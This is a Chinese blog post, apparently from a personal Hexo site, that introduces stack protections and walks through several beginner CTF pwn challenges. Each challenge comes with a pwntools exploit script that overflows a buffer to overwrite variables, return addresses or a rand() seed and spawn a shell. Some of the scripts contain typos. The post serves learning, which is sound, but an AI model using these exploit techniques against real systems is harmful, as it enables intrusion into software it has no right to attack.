@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="baidu-site-verification" content="XF2UidoKuF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/k32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/k16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF PWN,二进制漏洞,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="程序的内存结构 栈防护技术RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic lin">
+<meta name="keywords" content="CTF PWN,二进制漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基本的栈溢出">
+<meta property="og:url" content="http://keven.ss06.com/2019/10/08/基本的栈溢出/index.html">
+<meta property="og:site_name" content="Keven S">
+<meta property="og:description" content="程序的内存结构 栈防护技术RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic lin">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://keven.ss06.com/images/neicunjiegou.jpg">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu1.jpg">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu3.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu4.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu5.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu2-1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu2-2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu3-1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu3-2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu3-3.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu3-4.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu4-1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu4-2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu4-3.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu4-4.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu4-5.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu4-6.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu5-1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu5-2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu6-1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu6-2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu6-3.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu7-1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu7-2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu7-3.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu7-4.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-3.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-4.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-5.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-6.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-7.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-8.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-9.png">
+<meta property="og:image" content="http://keven.ss06.com/images/zhanyichu8-10.png">
+<meta property="og:updated_time" content="2019-10-09T12:13:49.990Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基本的栈溢出">
+<meta name="twitter:description" content="程序的内存结构 栈防护技术RELRO在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic lin">
+<meta name="twitter:image" content="http://keven.ss06.com/images/neicunjiegou.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://keven.ss06.com/2019/10/08/基本的栈溢出/">
+
+
+
+
+
+  <title>基本的栈溢出 | Keven S</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Keven S</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">从来如此，便对么？</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://keven.ss06.com/2019/10/08/基本的栈溢出/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Keven">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/temp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Keven S">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">基本的栈溢出</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-08T21:25:44+08:00">
+                2019-10-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-10-09T20:13:49+08:00">
+                2019-10-09
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">PWN</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>次
+            </span>
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="程序的内存结构"><a href="#程序的内存结构" class="headerlink" title="程序的内存结构"></a>程序的内存结构</h2><p><img src="/images/neicunjiegou.jpg" alt></p>
+<h2 id="栈防护技术"><a href="#栈防护技术" class="headerlink" title="栈防护技术"></a>栈防护技术</h2><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。（参考RELRO技术细节）</p>
+<h4 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h4><p>栈溢出检查，用Canary金丝雀值是否变化来检测,Canary found表示开启。</p>
+<p>金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p>
+<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p> No Execute，栈不可执行，也就是windows上的DEP。<br><img src="/images/zhanyichu1.jpg" alt></p>
+<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>position-independent executables, 位置无关的可执行文件，也就是常说的ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。</p>
+<h4 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h4><p>分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。</p>
+<p>DEP的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。硬件DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD称之为No-Execute Page-Protection（NX），Intel称之为Execute Disable Bit（XD）</p>
+<h2 id="0x01-where-did-you-born"><a href="#0x01-where-did-you-born" class="headerlink" title="0x01 where did you born"></a>0x01 where did you born</h2><p>先checksec下，看下防护措施：<br><img src="/images/zhanyichu2.png" alt></p>
+<p>没有开启PIE。<br>直接放到IDA里看下：</p>
+<p><img src="/images/zhanyichu3.png" alt></p>
+<p>图中箭头处即是溢出点。<br>分析下</p>
+<p>第一次输入overflowme，如果等于1926就会退出，但是想要拿到flag，就需要overflowme的值为1926，那就很明显了，第一次输入的时候随便输个数只要不是1926就行，第二次输入v4 这个数组的时候，利用缓冲区溢出，将overflowme这个变量的值给覆盖成1926就行了，将1926转化为16进制为0x786。<br>通过IDA看下数组和overflow这个变量之间的距离：<br><img src="/images/zhanyichu4.png" alt></p>
+<p>0x20-0x18，得到距离是8个字节。只要填充8个字节的垃圾数据，再将其后4个字节的空间覆盖为0x00000786就可以了。此时栈空间如下图：<br><img src="/images/zhanyichu5.png" alt></p>
+<p>脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">a=remote(<span class="string">'111.198.29.45'</span>,<span class="string">"50711"</span>)</span><br><span class="line">a=process(<span class="string">'./when_did_you_born'</span>)</span><br><span class="line">a.recvuntil(<span class="string">"What's Your Birth?"</span>)</span><br><span class="line">a.send(<span class="string">'1998'</span>)</span><br><span class="line">a.recvuntil(<span class="string">"What's Your Name?"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*8+p32(0x00000786)</span><br><span class="line">a.senline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-hello-pwn"><a href="#0x02-hello-pwn" class="headerlink" title="0x02 hello_pwn"></a>0x02 hello_pwn</h2><p>用IDA查看源码：<br><img src="/images/zhanyichu2-1.png" alt></p>
+<p><img src="/images/zhanyichu2-2.png" alt></p>
+<p>可以看到unk_601068跟dword_60106c是连在一起的，所以只需要在read处溢出unk_601068覆盖dword_60106c为0x6E756161即可.<br>exp:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">'./hello_pwn'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"31004"</span>)</span><br><span class="line">payload = 4*<span class="string">'a'</span> + p32(0x6E756161)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-level0"><a href="#0x03-level0" class="headerlink" title="0x03 level0"></a>0x03 level0</h2><p>首先用checksec查一下保护。几乎没开什么保护措施。<br><img src="/images/zhanyichu3-1.png" alt></p>
+<p>用ida反汇编。main函数就调用了两个函数。<br>跟进第二个函数<br><img src="/images/zhanyichu3-2.png" alt></p>
+<p><img src="/images/zhanyichu3-3.png" alt></p>
+<p>找到溢出点，通过buf缓冲区。又找到函数callsystem()。<br>只要控制程序返回到callsystem地址即可。找到callsystem地址。<br><img src="/images/zhanyichu3-4.png" alt></p>
+<p>脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">a=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"53539"</span>)</span><br><span class="line"><span class="comment">#a.recvuntil("Hello, World")</span></span><br><span class="line">payload=0x88*<span class="string">'a'</span>+p64(0x400596)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>因为是64位程序，所以覆盖rbp和返回地址时都要用64位数据</p>
+<h2 id="0x04-level4"><a href="#0x04-level4" class="headerlink" title="0x04 level4"></a>0x04 level4</h2><p><img src="/images/zhanyichu4-1.png" alt></p>
+<p>放到ida中发现了“/bin/sh”串，和system函数，可以利用==</p>
+<p><img src="/images/zhanyichu4-2.png" alt></p>
+<p><img src="/images/zhanyichu4-3.png" alt></p>
+<p><img src="/images/zhanyichu4-4.png" alt></p>
+<p><img src="/images/zhanyichu4-5.png" alt></p>
+<p>所以只要在vuln函数返回时跳转到system函数，同时添加参数“/bin/sh”就可以实现<br>exp:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,9878)</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_addr = elf.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(0x88 + 0x4) <span class="comment">#辣鸡填充值</span></span><br><span class="line">payload += p32(sys_addr)   <span class="comment">#覆盖返回地址到system函数</span></span><br><span class="line">payload += p32(0xdeadbeef)　　<span class="comment">#随意填写system函数调用结束的返回地址</span></span><br><span class="line">payload += p32(bin_addr)　　<span class="comment">#system函数的参数，指向“/bin/sh”，实现调用</span></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> p = remote(<span class="string">"111.198.29.45"</span>,<span class="string">"50821"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols[<span class="string">"system"</span>] </span><br><span class="line">bin_addr = elf.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x8c </span><br><span class="line">payload += p32(sys_addr) </span><br><span class="line">payload += p32(0x12345678) </span><br><span class="line">payload += p32(bin_addr)<span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">system=0x08048320</span></span><br><span class="line"><span class="string">binsh=0x0804A024</span></span><br><span class="line"><span class="string">payload='</span>a<span class="string">'*0x8c</span></span><br><span class="line"><span class="string">payload+=p32(system)</span></span><br><span class="line"><span class="string">payload+=p32(0x12345678)</span></span><br><span class="line"><span class="string">payload+=p32(binsh)</span></span><br><span class="line"><span class="string">p.recvline() </span></span><br><span class="line"><span class="string">p.sendline(payload) </span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<p>此时程序流程如图<br><img src="/images/zhanyichu4-6.png" alt></p>
+<p>相当于进行了两次溢出。第一次vulnable函数返回地址溢出为system函数地址，第二次system函数返回地址溢出为bin/sh地址</p>
+<h2 id="0x05-warmup-csaw"><a href="#0x05-warmup-csaw" class="headerlink" title="0x05 warmup-csaw"></a>0x05 warmup-csaw</h2><p><img src="/images/zhanyichu5-1.png" alt></p>
+<p><img src="/images/zhanyichu5-2.png" alt></p>
+<p>这个程序没有开启任何的保护，而且文件是动态链接却没有给出libc</p>
+<p>丢进IDA看一下：</p>
+<p>看到了熟悉的gets()函数，通常一看到这个函数就八成有缓冲区溢出漏洞，可以看出程序为v5开辟了40H的存储空间，所以输入长度超过40H即可造成溢出，再看sprint()函数</p>
+<p>进入sub_40060D中看一下：</p>
+<p>可以看到这个函数是获取flag的关键点，程序会打印出此函数的位置，即0x40060d，到这里思路就差不多明了了，我们需要控制溢出位置，把返回地址改为此函数的地址</p>
+<p>exp:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">a=remote(<span class="string">" "</span>,<span class="string">" "</span>)</span><br><span class="line">a.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload= <span class="string">'a'</span>*0x40+<span class="string">'a'</span>*8+p64(0x000000000040060D)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-guss-num"><a href="#0x06-guss-num" class="headerlink" title="0x06 guss num"></a>0x06 guss num</h2><p><img src="/images/zhanyichu6-1.png" alt></p>
+<p>开启了栈溢出保护和地址随机化，是64位程序</p>
+<p><img src="/images/zhanyichu6-2.png" alt></p>
+<p>猜随机数的一题，种子是seed[0]，循环10次，10次均对即可跳到sub_C3E函数执行system(“cat flag”)，checksec一波发现开启了canary,不能直接栈溢出到sub_C3E函数</p>
+<p><img src="/images/zhanyichu6-3.png" alt></p>
+<p>发现var_30在栈中占0x20，可以覆盖到seed<br>如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。<br>只要把seed覆盖为我们已知道的数字，那么生成的随机数也可以算出了。<br>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br>对于该题目，我们将随机种子设置为0或1都可</p>
+<h4 id="关于ctype库与dll"><a href="#关于ctype库与dll" class="headerlink" title="关于ctype库与dll"></a>关于ctype库与dll</h4><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p>
+<h4 id="libc共享库"><a href="#libc共享库" class="headerlink" title="libc共享库"></a>libc共享库</h4><p>可以使用ldd查找</p>
+<pre><code>kk@ubuntu:~/Desktop/black/GFSJ/guess_num$ ldd guess_num 
+linux-vdso.so.1 =&gt;  (0x00007ffd3f5a0000)
+libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e6c0b0000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</code></pre><p>也可以在脚本中通过elf文件查找</p>
+<pre><code>elf = ELF(&apos;./guess_num&apos;)
+ libc = elf.libc</code></pre><p>  exp如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,46063)</span><br><span class="line">a = process(<span class="string">'./guess_num'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./guess_num'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(1)</span><br><span class="line">a.recvuntil(<span class="string">'Please let me know your name!'</span>)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    num = str(libc.rand()%6+1)</span><br><span class="line">    a.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">    a.sendline(num)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import*</span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">p = process(<span class="string">"./guess_num"</span>) </span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"A"</span>*0x20 + p64(1)</span><br><span class="line">p.sendlineafter(<span class="string">"name:"</span>,pay)</span><br><span class="line"></span><br><span class="line">libc.srand(1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10): </span><br><span class="line">	p.sendlineafter(<span class="string">"number:"</span>,str(libc.rand()%6 + 1))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-dice-game"><a href="#0x07-dice-game" class="headerlink" title="0x07 dice game"></a>0x07 dice game</h2><p>和上题类似。rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。<br><img src="/images/zhanyichu7-1.png" alt></p>
+<p>题目分析：<br>这边就可以看到，buf覆盖0x40位就能覆盖到seed。<br>buf 长度最长为 0x50 但是当输入大于 49 的时候不会被截断，所以我们只要覆盖到之前的 seed 就可以为所欲为了。<br>同时注意到 seed 跟 buf 相差的偏移是 0x40，所以只要 68 个字符就可以溢出覆盖 seed 了。<br><img src="/images/zhanyichu7-2.png" alt></p>
+<p>sub_A20()如下，就是比较你输入的数是否和产生的随机数相等。<br><img src="/images/zhanyichu7-3.png" alt></p>
+<p>当回答正确50次时，会执行sub_B28这个函数，读取flag。<br><img src="/images/zhanyichu7-4.png" alt></p>
